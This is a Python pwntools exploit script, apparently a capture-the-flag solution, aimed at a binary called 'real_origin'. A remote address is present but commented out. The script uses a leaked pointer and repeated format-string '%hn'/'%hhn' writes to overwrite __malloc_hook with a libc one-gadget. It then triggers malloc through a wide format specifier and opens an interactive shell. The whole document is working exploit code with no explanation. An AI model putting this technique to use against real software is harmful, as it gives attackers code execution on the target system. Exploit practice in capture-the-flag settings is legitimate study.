#!/usr/bin/python
from pwn import *

#p = remote('200.200.200.106', 44444)
p = process('./real_origin')

def set1(val, idx):
  return '%2$' + str(val) + 'c' + '%' + str(idx) + '$hhn'
def set2(val, idx):
  return '%2$' + str(val) + 'c' + '%' + str(idx) + '$hn'

def payload(format, arg):
  p.recvuntil('string -->')
  print format
  p.sendline(format)
  p.recvuntil('-->')
  p.sendline(str(arg))

p.recvuntil('Pointer is ')
leak = int(p.recvline()[:-1], 16)

p.sendline(str(leak + 26))
p.recvuntil('value is ')

value = int(p.recvline()[:-1], 16)
print hex(value)

base = 0
malloc_hook = base + 0x3c3b10
magic_off = 0x4526a
magic = base + magic_off

print hex(leak)
print hex(magic)


payload(set2(0xab10, 1), leak+24)
payload(set1(value + 0x3a, 1), leak+26)
payload(set2(0xc26a, 9), 0)

payload(set2(0xab12, 1), leak+24)
payload(set1(value + 2, 9), 0)

payload('%123112d', 11234)

for i in range(9):
  payload('1', '1')

p.interactive()

